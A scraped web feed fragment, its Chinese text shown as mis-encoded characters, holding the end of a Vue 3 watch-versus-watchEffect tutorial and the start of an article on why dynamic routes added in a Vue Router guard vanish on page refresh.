<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é»˜è®¤ï¼šç»„ä»¶æ›´æ–°å‰æ‰§è¡Œ</span>
<span class="hljs-title function_">watch</span>(source, callback)

<span class="hljs-comment">// DOM æ›´æ–°åæ‰§è¡Œ</span>
<span class="hljs-title function_">watch</span>(source, callback, { <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span> })

<span class="hljs-comment">// åŒæ­¥æ‰§è¡Œï¼ˆæ…ç”¨ï¼‰</span>
<span class="hljs-title function_">watch</span>(source, callback, { <span class="hljs-attr">flush</span>: <span class="hljs-string">'sync'</span> })

<span class="hljs-comment">// watchEffect ä¹Ÿæœ‰ç›¸åŒçš„é€‰é¡¹</span>
<span class="hljs-title function_">watchEffect</span>(callback, { <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span> })
</code></pre>
<h4 data-id="heading-16">4.3 ä½¿ç”¨ reactive å¯¹è±¡çš„æ³¨æ„äº‹é¡¹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { reactive, watch, watchEffect, toRefs } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">user</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ˜'</span> }
})

<span class="hljs-comment">// âŒ é”™è¯¯ï¼šç›´æ¥ç›‘å¬ reactive å¯¹è±¡</span>
<span class="hljs-title function_">watch</span>(state, callback) <span class="hljs-comment">// å¯èƒ½ä¼šå¾—åˆ°æ„å¤–ç»“æœ</span>

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ getter å‡½æ•°</span>
<span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> state.<span class="hljs-property">count</span>, callback)

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ toRefs</span>
<span class="hljs-keyword">const</span> { count } = <span class="hljs-title function_">toRefs</span>(state)
<span class="hljs-title function_">watch</span>(count, callback)

<span class="hljs-comment">// âœ… watchEffect å¯ä»¥ç›´æ¥ä½¿ç”¨</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(state.<span class="hljs-property">count</span>, state.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>)
})
</code></pre>
<h3 data-id="heading-17">äº”ã€é€‰æ‹©æŒ‡å—ï¼šä»€ä¹ˆæ—¶å€™ç”¨ä»€ä¹ˆï¼Ÿ</h3>
<h4 data-id="heading-18">ä½¿ç”¨ watch çš„åœºæ™¯ï¼š</h4>
<ol>
<li><strong>éœ€è¦æ–°æ—§å€¼å¯¹æ¯”æ—¶</strong></li>
<li><strong>åªå…³å¿ƒç‰¹å®šæ•°æ®çš„å˜åŒ–</strong></li>
<li><strong>éœ€è¦æ§åˆ¶åˆå§‹æ‰§è¡Œæ—¶æœº</strong></li>
<li><strong>æ•°æ®å˜åŒ–é¢‘ç‡é«˜ï¼Œä½†ä¸éœ€è¦æ¯æ¬¡å˜åŒ–éƒ½æ‰§è¡Œ</strong></li>
<li><strong>éœ€è¦ç›‘å¬åµŒå¥—å¯¹è±¡çš„ç‰¹å®šå±æ€§</strong></li>
</ol>
<h4 data-id="heading-19">ä½¿ç”¨ watchEffect çš„åœºæ™¯ï¼š</h4>
<ol>
<li><strong>ä¾èµ–å¤šä¸ªæ•°æ®æºï¼Œä¸æƒ³ä¸€ä¸€åˆ—å‡º</strong></li>
<li><strong>å‰¯ä½œç”¨é€»è¾‘å¤æ‚ï¼Œä¾èµ–å…³ç³»åŠ¨æ€å˜åŒ–</strong></li>
<li><strong>éœ€è¦ç«‹å³æ‰§è¡Œå¹¶å“åº”å¼æ›´æ–°</strong></li>
<li><strong>é€»è¾‘ç›¸å¯¹ç‹¬ç«‹ï¼Œè‡ªæˆä¸€ä½“</strong></li>
<li><strong>è¿›è¡Œå¼‚æ­¥æ“ä½œï¼Œéœ€è¦è‡ªåŠ¨æ¸…ç†</strong></li>
</ol>
<h4 data-id="heading-20">å†³ç­–æµç¨‹å›¾ï¼š</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[å¼€å§‹é€‰æ‹©] --&gt; B{éœ€è¦ç›‘å¬ä»€ä¹ˆ?}
    
    B --&gt;|æ˜ç¡®çš„ç‰¹å®šæ•°æ®| C[è€ƒè™‘ watch]
    B --&gt;|å¤šä¸ª/åŠ¨æ€çš„ä¾èµ–| D[è€ƒè™‘ watchEffect]
    
    C --&gt; C1{éœ€è¦æ–°æ—§å€¼å¯¹æ¯”?}
    C1 --&gt;|æ˜¯| C2[é€‰æ‹© watch]
    C1 --&gt;|å¦| C3{åˆå§‹éœ€è¦ç«‹å³æ‰§è¡Œ?}
    
    D --&gt; D1{éœ€è¦è‡ªåŠ¨ä¾èµ–è¿½è¸ª?}
    D1 --&gt;|æ˜¯| D2[é€‰æ‹© watchEffect]
    D1 --&gt;|å¦| C3
    
    C3 --&gt;|æ˜¯ä¸”ä¾èµ–ç®€å•| C4[watch + immediate]
    C3 --&gt;|æ˜¯ä¸”ä¾èµ–å¤æ‚| D2
    C3 --&gt;|å¦| C5[watch]
    
    C2 --&gt; E[æœ€ç»ˆå†³å®š: watch]
    C4 --&gt; E
    C5 --&gt; E
    D2 --&gt; F[æœ€ç»ˆå†³å®š: watchEffect]
</code></pre>
<h3 data-id="heading-21">å…­ã€å®æˆ˜æ€»ç»“</h3>
<h4 data-id="heading-22">6.1 é»„é‡‘æ³•åˆ™</h4>
<ol>
<li><strong>æ˜ç¡®ä¾èµ–ç”¨ watchï¼Œæ¨¡ç³Šä¾èµ–ç”¨ watchEffect</strong></li>
<li><strong>éœ€è¦æ—§å€¼ç”¨ watchï¼Œåªè¦æœ€æ–°å€¼ç”¨ watchEffect</strong></li>
<li><strong>åˆå§‹ä¸æ‰§è¡Œç”¨ watchï¼Œç«‹å³æ‰§è¡Œç”¨ watchEffect</strong></li>
<li><strong>ç®€å•ç›‘å¬ç”¨ watchï¼Œå¤æ‚å‰¯ä½œç”¨ç”¨ watchEffect</strong></li>
</ol>
<h4 data-id="heading-23">6.2 ä»£ç ç¤ºä¾‹å¯¹æ¯”</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åœºæ™¯ï¼šç”¨æˆ·è¿‡æ»¤å’Œæ’åº</span>
<span class="hljs-keyword">const</span> users = <span class="hljs-title function_">ref</span>([])
<span class="hljs-keyword">const</span> filter = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> sortBy = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'name'</span>)

<span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šä½¿ç”¨ watchï¼ˆæ˜ç¡®ï¼‰</span>
<span class="hljs-title function_">watch</span>([filter, sortBy], <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">fetchFilteredUsers</span>(filter.<span class="hljs-property">value</span>, sortBy.<span class="hljs-property">value</span>)
}, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> })

<span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šä½¿ç”¨ watchEffectï¼ˆè‡ªåŠ¨ï¼‰</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">fetchFilteredUsers</span>(filter.<span class="hljs-property">value</span>, sortBy.<span class="hljs-property">value</span>)
})

<span class="hljs-comment">// ç»“è®ºï¼šä¸¤è€…éƒ½èƒ½å·¥ä½œï¼Œæ ¹æ®å–œå¥½é€‰æ‹©</span>
</code></pre>
<h4 data-id="heading-24">6.3 æœ€ä½³å®è·µå»ºè®®</h4>
<ol>
<li><strong>åœ¨ç»„åˆå¼å‡½æ•°ä¸­ä¼˜å…ˆä½¿ç”¨ watchEffect</strong>ï¼Œå› ä¸ºå®ƒæ›´ç¬¦åˆå“åº”å¼æ€ç»´</li>
<li><strong>åœ¨éœ€è¦ç²¾ç¡®æ§åˆ¶æ—¶ä½¿ç”¨ watch</strong>ï¼Œç‰¹åˆ«æ˜¯éœ€è¦é˜²æŠ–æˆ–èŠ‚æµæ—¶</li>
<li><strong>è®°å¾—æ¸…ç†å‰¯ä½œç”¨</strong>ï¼Œç‰¹åˆ«æ˜¯å®šæ—¶å™¨å’Œå¼‚æ­¥æ“ä½œ</li>
<li><strong>è°¨æ…ä½¿ç”¨ deep å’Œ flush é€‰é¡¹</strong>ï¼Œå®ƒä»¬å¯èƒ½å½±å“æ€§èƒ½</li>
<li><strong>åœ¨ Vue 3.2+ ä¸­è€ƒè™‘ä½¿ç”¨ watchPostEffect å’Œ watchSyncEffect</strong> ä½œä¸ºè¯­æ³•ç³–</li>
</ol>
<h3 data-id="heading-25">ç»“è¯­</h3>
<p><code>watch</code> å’Œ <code>watchEffect</code> éƒ½æ˜¯ Vue 3 å“åº”å¼ç³»ç»Ÿçš„å¼ºå¤§å·¥å…·ï¼Œæ²¡æœ‰ç»å¯¹çš„ä¼˜åŠ£ï¼Œåªæœ‰é€‚åˆçš„åœºæ™¯ã€‚ç†è§£å®ƒä»¬çš„æ ¸å¿ƒå·®å¼‚ï¼Œç»“åˆå…·ä½“éœ€æ±‚é€‰æ‹©ï¼Œæ‰èƒ½å†™å‡ºæ›´ä¼˜é›…ã€é«˜æ•ˆçš„ä»£ç ã€‚</p>
<p>è®°ä½ï¼š<code>watch</code> æ˜¯"æˆ‘å‘Šè¯‰ä½ ç›‘å¬ä»€ä¹ˆ"ï¼Œè€Œ <code>watchEffect</code> æ˜¯"ä½ è‡ªå·±å‘ç°éœ€è¦ç›‘å¬ä»€ä¹ˆ"ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ·±åº¦è§£æèƒ½å¸®åŠ©ä½ åœ¨ Vue 3 å¼€å‘ä¸­åšå‡ºæ›´æ˜æ™ºçš„é€‰æ‹©ï¼å¦‚æœä½ æœ‰æ›´å¤šç–‘é—®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€è®¨è®ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆä½ çš„åŠ¨æ€è·¯ç”± â€œåˆå§‹åŒ–äº†å´æ²¡ç”¨â€ï¼Ÿæ­ç§˜ Vue Router å¿«ç…§æ—¶æœºå‘]]></title>    <link>https://juejin.cn/post/7589893746080972841</link>    <guid>https://juejin.cn/post/7589893746080972841</guid>    <pubDate>2026-01-01T15:49:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746080972841" data-draft-id="7589893746080858153" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆä½ çš„åŠ¨æ€è·¯ç”± â€œåˆå§‹åŒ–äº†å´æ²¡ç”¨â€ï¼Ÿæ­ç§˜ Vue Router å¿«ç…§æ—¶æœºå‘"/> <meta itemprop="keywords" content="vue-router"/> <meta itemprop="datePublished" content="2026-01-01T15:49:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LJJå•Š_"/> <meta itemprop="url" content="https://juejin.cn/user/3459495131097818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆä½ çš„åŠ¨æ€è·¯ç”± â€œåˆå§‹åŒ–äº†å´æ²¡ç”¨â€ï¼Ÿæ­ç§˜ Vue Router å¿«ç…§æ—¶æœºå‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3459495131097818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LJJå•Š_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T15:49:06.000Z" title="Thu Jan 01 2026 15:49:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æåˆ° Vue Routerï¼Œç›¸ä¿¡æ¯ä¸€ä½å‰ç«¯å¼€å‘è€…éƒ½ä¸é™Œç”Ÿã€‚åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œå°¤å…¶æ˜¯æ­å»º<strong>æƒé™ç®¡æ§å‹åå°ç®¡ç†ç³»ç»Ÿ</strong>æ—¶ï¼Œå¾ˆå¤šåŒå­¦åº”è¯¥éƒ½é‡åˆ°è¿‡è¿™æ ·ä¸€ä¸ªæ£˜æ‰‹çš„é—®é¢˜ï¼šæˆ‘ä»¬éœ€è¦é€šè¿‡å‰ç«¯å®ç°æƒé™èœå•çš„åŠ¨æ€æ¸²æŸ“ä¸è·¯ç”±æ§åˆ¶ã€‚</p>
<p>å…ˆæ¥çœ‹ä¸€æ®µå¸¸è§çš„ä¸šåŠ¡ä»£ç ï¼šåœ¨è·¯ç”±å‰ç½®å®ˆå«ä¸­ï¼Œæˆ‘ä»¬åšäº†èœå•è·¯ç”±çš„åˆå§‹åŒ–å¤„ç† â€”â€” ç™»å½•æˆåŠŸåï¼Œå‰ç«¯ä¼šè¯·æ±‚æ¥å£è·å–å½“å‰ç”¨æˆ·å¯¹åº”çš„æƒé™èœå•åˆ—è¡¨ï¼Œå°†å…¶æŒä¹…åŒ–å­˜å‚¨åï¼Œåœ¨è·¯ç”±è·³è½¬å‰è°ƒç”¨Â <code>initRouter</code>Â æ–¹æ³•ï¼Œå®ç°åŠ¨æ€è·¯ç”±çš„æ·»åŠ ã€‚</p>
<p>ä½†æ­¤æ—¶ä¼šå‡ºç°ä¸€ä¸ªä»¤äººå›°æƒ‘çš„é—®é¢˜ï¼šå½“æˆ‘ä»¬æˆåŠŸè¿›å…¥æŸä¸ªåŠ¨æ€æ·»åŠ çš„è·¯ç”±é¡µé¢ï¼ˆä¾‹å¦‚Â <code>/dashboard</code>ï¼‰åï¼Œä¸€æ—¦åˆ·æ–°é¡µé¢ï¼Œè¯¥è·¯ç”±å°±ä¼š â€œä¸¢å¤±â€ï¼Œé¡µé¢æ— æ³•æ­£å¸¸æ¸²æŸ“ã€‚è¿™èƒŒåçš„åŸå› ç©¶ç«Ÿæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-js" lang="js">router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">path</span> !== <span class="hljs-string">'/login'</span> &amp;&amp; !userStore.<span class="hljs-property">token</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>)
  }
  <span class="hljs-keyword">if</span> (!isInitRouter) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åˆå§‹åŒ–èœå•Menu'</span>)
    <span class="hljs-title function_">initRouter</span>()
    isInitRouter = <span class="hljs-literal">true</span>
  }
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>() 
})
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ä¸€å¼€å§‹çš„é»˜è®¤é™æ€è·¯ç”±</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(), <span class="hljs-comment">// historyæ¨¡å¼</span>
  <span class="hljs-attr">routes</span>: [
    {
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
      <span class="hljs-attr">name</span>: <span class="hljs-string">'layout'</span>,
      <span class="hljs-attr">redirect</span>: <span class="hljs-string">'/dashboard'</span>,
      <span class="hljs-attr">children</span>: [],
      <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/layout/index.vue'</span>)
    },
    {
      <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>,
      <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/login/index.vue'</span>)
    }
  ]
})
</code></pre>
<p><strong>å¿«ç…§æ‹çš„æ˜¯ â€œå¯åŠ¨ç¬é—´è·¯ç”±è¡¨çš„å…¨è²Œâ€ï¼Œé»˜è®¤æ˜¯é™æ€è·¯ç”±è¡¨ï¼ˆå› ä¸ºåŠ¨æ€è·¯ç”±è¿˜æ²¡æœºä¼šæ³¨å†Œï¼‰ï¼Œä½†å¦‚æœåŠ¨æ€è·¯ç”±æå‰æ³¨å†Œäº†ï¼Œå¿«ç…§å°±ä¼šåŒ…å«å®ƒ</strong>ã€‚å¿«ç…§æ˜¯ã€Œå¯¼èˆªå‘¨æœŸå¯åŠ¨ç¬é—´ã€æ‹çš„ï¼Œè€Œæ˜¯ã€Œå¯¼èˆªå‘¨æœŸå¯åŠ¨ç¬é—´ã€æ‹ä¸€æ¬¡ï¼Œæ•´ä¸ªå¯¼èˆªå‘¨æœŸï¼ˆåŒ…æ‹¬æ‰€æœ‰å®ˆå«ã€åŒ¹é…ã€æ¸²æŸ“ç¯èŠ‚ï¼‰éƒ½å…±ç”¨è¿™ä»½å¿«ç…§ã€‚<br/>
å…ˆæ‹å¿«ç…§ï¼Œååˆå§‹åŒ–åŠ¨æ€è·¯ç”±ï¼Œåˆå§‹åŒ–æ”¹ä¸äº†å·²æ‹å¥½çš„å¿«ç…§ã€‚</p>
<ol>
<li><strong>å…ˆæ‹å¿«ç…§</strong>ï¼šå¯¼èˆªå‘¨æœŸä¸€å¯åŠ¨ï¼Œå°±ç«‹åˆ»ç»™å½“å‰çš„è·¯ç”±è¡¨æ‹ä¸€å¼  â€œåªè¯»ç…§ç‰‡â€ï¼ˆå‰¯æœ¬ï¼‰ï¼Œè¿™å¼ ç…§ç‰‡é‡Œåªæœ‰æå‰å®šä¹‰çš„é™æ€è·¯ç”±ï¼ˆæ¯”å¦‚ <code>/login</code>ï¼‰ï¼Œæ²¡æœ‰åŠ¨æ€è·¯ç”±ï¼ˆæ¯”å¦‚ <code>/dashboard</code>ï¼‰ï¼›</li>
<li><strong>ååˆå§‹åŒ–</strong>ï¼šå¿«ç…§æ‹å¥½ä¹‹åï¼Œæ‰ä¼šè¿›å…¥ <code>beforeEach</code> å®ˆå«ï¼Œæ‰§è¡Œä½ çš„ <code>initRouter()</code> æ–¹æ³•ï¼ˆåŠ¨æ€æ·»åŠ  <code>/dashboard</code> ç­‰è·¯ç”±ï¼Œæ›´æ–°åŸè·¯ç”±è¡¨ï¼‰ï¼›</li>
<li><strong>åˆå§‹åŒ–æ”¹ä¸äº†å·²æ‹å¥½çš„å¿«ç…§</strong>ï¼šä½ é€šè¿‡ <code>initRouter()</code> ç¡®å®æ›´æ–°äº†ã€ŒåŸè·¯ç”±è¡¨ã€ï¼ˆæ–°å¢äº†åŠ¨æ€è·¯ç”±ï¼‰ï¼Œä½†é‚£å¼ æå‰æ‹å¥½çš„ã€Œå¿«ç…§ç…§ç‰‡ã€ä¸ä¼šåŒæ­¥æ›´æ–° â€”â€” å®ƒæ˜¯ä¸€å¼ ç‹¬ç«‹çš„ã€å›ºå®šä¸å˜çš„å‰¯æœ¬ï¼Œå¯¼èˆªå‘¨æœŸå…¨ç¨‹åªä¼šç”¨è¿™å¼ å¿«ç…§åšäº‹ï¼Œä¸ä¼šå†å»è¯»å–æ›´æ–°åçš„åŸè·¯ç”±è¡¨ã€‚</li>
</ol>

























<table><thead><tr><th><code>next() </code><strong>çš„è°ƒç”¨æ–¹å¼</strong></th><th><strong>è¡Œä¸ºæè¿°</strong></th><th><strong>æ˜¯å¦å¼€å¯æ–°å¯¼èˆªå‘¨æœŸï¼Ÿ</strong></th></tr></thead><tbody><tr><td><code>next()</code>ï¼ˆæ— å‚æ•°ï¼‰</td><td>ç»§ç»­å½“å‰å¯¼èˆªå‘¨æœŸï¼Œç”¨å½“å‰å‘¨æœŸçš„å¿«ç…§åŒ¹é…è·¯ç”±</td><td>âŒ ä¸å¼€å¯ï¼Œæ²¿ç”¨æ—§å‘¨æœŸ</td></tr><tr><td><code>next('/login')</code>ï¼ˆå¸¦è·¯å¾„å­—ç¬¦ä¸²ï¼‰</td><td>ç»ˆæ­¢å½“å‰å¯¼èˆªå‘¨æœŸï¼Œå‘èµ·ä¸€ä¸ªæ–°å¯¼èˆªå‘¨æœŸï¼ˆç›®æ ‡ï¼š<code>/login</code>ï¼‰</td><td>âœ… å¼€å¯æ–°å‘¨æœŸ</td></tr><tr><td><code>next({ ...to, replace: true })</code>ï¼ˆå¸¦è·¯ç”±å¯¹è±¡ï¼‰</td><td>ç»ˆæ­¢å½“å‰å¯¼èˆªå‘¨æœŸï¼Œå‘èµ·ä¸€ä¸ªæ–°å¯¼èˆªå‘¨æœŸï¼ˆç›®æ ‡ï¼šè·¯ç”±å¯¹è±¡æŒ‡å®šçš„è·¯å¾„ï¼‰</td><td>âœ… å¼€å¯æ–°å‘¨æœŸ</td></tr></tbody></table>
<p><strong>æ³¨ï¼šå¼€å¯æ–°çš„å¯¼èˆªå‘¨æœŸä¼šé‡æ–°èµ°ä¸€æ¬¡è·¯ç”±å®ˆå«</strong></p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯å¯¼èˆªå‘¨æœŸï¼Ÿ</h2>
<p>å¯¼èˆªå‘¨æœŸçš„å¯åŠ¨æ—¶æœºæ˜¯åˆ·æ–° / è¿›å…¥é¡µé¢çš„ä¸€ç¬é—´ã€ï¼Œä½†ã€Œå¯¼èˆªå‘¨æœŸæœ¬èº«æ˜¯ä¸€æ•´å¥—è¿è´¯çš„æµç¨‹ã€â€”â€” ä¸æ˜¯ â€œç¬é—´ç»“æŸâ€ï¼Œè€Œæ˜¯ä» â€œå¯åŠ¨ç¬é—´â€ å¼€å§‹ï¼Œä¾æ¬¡æ‰§è¡Œ â€œæ‹å¿«ç…§ã€å®ˆå«ã€åŒ¹é…ã€æ¸²æŸ“â€ ç­‰æ­¥éª¤ï¼Œç›´åˆ°é¡µé¢æ˜¾ç¤ºå®Œæˆæ‰ç»“æŸï¼ˆåªæ˜¯æ•´ä¸ªæµç¨‹å¾ˆå¿«ï¼Œä½“æ„Ÿä¸Šåƒ â€œä¸€ç¬é—´â€ï¼‰ã€‚</p>
<h2 data-id="heading-1">è§£å†³æ–¹æ¡ˆ</h2>
<p>ä¸€ã€è¦è§£å†³åŠ¨æ€è·¯ç”±ç”Ÿæ•ˆçš„é—®é¢˜ï¼Œæ ¸å¿ƒæ€è·¯å°±æ˜¯åœ¨æ·»åŠ è·¯ç”±åï¼Œé€šè¿‡ <code>next(retryPath)</code>ç­‰æ–¹å¼<strong>ä¸»åŠ¨å¼€å¯ä¸€ä¸ªæ–°çš„å¯¼èˆªå‘¨æœŸ</strong>ã€‚åœ¨æ–°çš„å‘¨æœŸé‡Œï¼Œè·¯ç”±å™¨å°±ä¼šåŸºäºåŒ…å«æ–°è·¯ç”±çš„ã€æ›´æ–°åçš„æ˜ å°„è¡¨æ¥æ‹â€œå¿«ç…§â€äº†</p>
